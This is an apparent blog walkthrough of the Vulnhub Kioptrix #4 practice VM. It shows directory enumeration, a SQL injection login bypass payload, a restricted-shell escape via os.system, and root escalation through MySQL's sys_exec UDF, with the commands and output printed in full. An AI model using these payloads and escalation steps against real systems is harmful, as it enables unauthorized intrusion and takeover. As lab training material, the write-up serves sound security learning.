### [Vulnhub - Kioptrix #4](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)

## Enumeration
Lets add `kioptrix4.com` to `hosts` file and start with `Nmap`

### Nmap

Let's check out the web application that is running on port `80`.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/kioptrix4/webapp.png){: .align-center}

### DirBuster
```bash  
http://kioptrix4.com:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/index/
/images/
/icons/
/john/
/robert/

Dirs found with a 403 response:

/cgi-bin/
/doc/

Dirs found with a 302 response:

/member/
/logout/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.php
/checklogin.php

Files found with a 302 responce:

/member.php
/logout.php
/john/john.php
/robert/robert.php
```

`DirBuster` found 2 pages named `john.php` and `robert.php`. But accessing these pages, redirects us to the login page. So `john` and `robert` must be two users on this web application.

### Sql Injection
The `password` field is prone to `sql` injection as it is throwing errors when we add `'` as input.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/kioptrix4/sql1.png){: .align-center}
    
Lets try `sql` authentication bypass by using the following payload.

```bash
' or 1=1#
```

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/kioptrix4/sql2.png){: .align-center}
    
And we are greeted with username and password. So the backend SQL Query must be something like this

```sql
SELECT * FROM users where username='john' and password='1' or '1'='1'
```

## Low Shell

Let's `SSH` into the box using the creds we got.

```bash
kali@kali:~$ ssh john@kioptrix4.com
john@kioptrix4.com's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ id
*** unknown command: id
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
john:~$ lpath
Allowed:
 /home/john
```

On login we are greeted with a restricted shell. This shell essentially limits the commands user can use.

Alright so we can try breaking out from this shell. There are lot of techniques that can be used to [escape restricted shells.](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)

We can break out using the following command.

```bash
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

## Low Shell Enumeration

Found `MySQL` creds from `checklogin.php` file

1. We can connect to `MySLQL` as `root` without password.
```bash
john@Kioptrix4:~$ cat /var/www/checklogin.php 
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```
2. `MySQL` is running as `root`
```bash
root      4034  0.0  0.1   1772   524 ?        S    01:32   0:00 /bin/sh /usr/bin/mysqld_safe
root      4076  0.0  4.6 127140 16452 ?        Sl   01:32   0:07 /usr/sbin/mysqld   
                    --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid 
                    --skip-external-locking --port=3306 --socket=/var/run/mysqld/my
root      4078  0.0  0.1   1700   556 ?        S    01:32   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
```

Since `MySQL` is running as `root`, can use it to escalate our privilege to `root` using a MySQL UDF or [User Defined Function.](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

## Root Shell

So essentially we can execute command as `root` using `sys_exec`.

Let's connect to `MySQL` and try it out.
```bash
john@Kioptrix4:~$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.


mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.01 sec)

mysql> select sys_exec('touch /root/test');
+------------------------------+
| sys_exec('touch /root/test') |
+------------------------------+
| NULL                         | 
+------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
john@Kioptrix4:~$ cd /root
john@Kioptrix4:/root$ ls
congrats.txt  lshell-0.9.12  test
```
So we can see that we have successfully created a file in `root` directory. So lets change group of `john` to admin.

```bash
john@Kioptrix4:~$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.04 sec)

mysql> exit
Bye
john@Kioptrix4:~$ sudo su
[sudo] password for john: 
root@Kioptrix4:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix4:/home/john# cat /root/congrats.txt 
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

root@Kioptrix4:/home/john# 
```

And we are root!

## Afterthoughts
It was an easy box but required some out of the box thinking. This was my first time experience with restricted shell and MySQL UDF code execution, so it was a good learning experience.
